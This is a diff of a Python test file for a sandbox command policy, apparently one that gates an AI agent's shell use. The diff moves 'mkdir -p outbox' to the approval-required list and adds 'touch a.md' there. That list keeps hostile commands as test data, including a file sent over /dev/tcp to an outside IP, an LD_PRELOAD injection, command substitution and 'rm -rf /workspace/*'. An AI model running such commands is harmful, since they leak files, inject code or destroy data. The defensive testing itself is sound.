@@ -135,7 +135,7 @@ DEFAULT = Policy.load(Settings().policy_path)
 
 @pytest.mark.parametrize("cmd", [
     "ls -la /workspace", "cat a.md | grep 매출 | wc -l", "cd /workspace && ls; pwd", "wc -c < big.txt",
-    "ls 2>/dev/null", "head -n 5 a.md 2>&1", "sha256sum blob.bin; ls -a", "mkdir -p outbox", "echo hello",
+    "ls 2>/dev/null", "head -n 5 a.md 2>&1", "sha256sum blob.bin; ls -a", "echo hello",
 ])
 def test_default_policy_allows_read_only_exec(cmd):
     assert DEFAULT.decide("exec", {"command": cmd}).action == "allow", cmd
@@ -146,6 +146,7 @@ def test_default_policy_allows_read_only_exec(cmd):
     "cat a > /dev/tcp/203.0.113.7/443", "cat $(echo a)", "ls `id`", "sh -c 'ls'", "LD_PRELOAD=/x.so cat a",
     "ls |& python3 x.py", "ls; truncate -s0 a.md", "mv a b", "cp a b", "sed -i d a.md", "ls <(id)",
     "cat a\npython3 x.py", "for f in *; do cat $f; done", "rm -rf /workspace/*",
+    "mkdir -p outbox", "touch a.md",   # 파일·폴더를 만든다 (결과함은 샌드박스를 만들 때 이미 있다)
 ])
 def test_default_policy_needs_approval(cmd):
     assert DEFAULT.decide("exec", {"command": cmd}).action == "require_approval", cmd
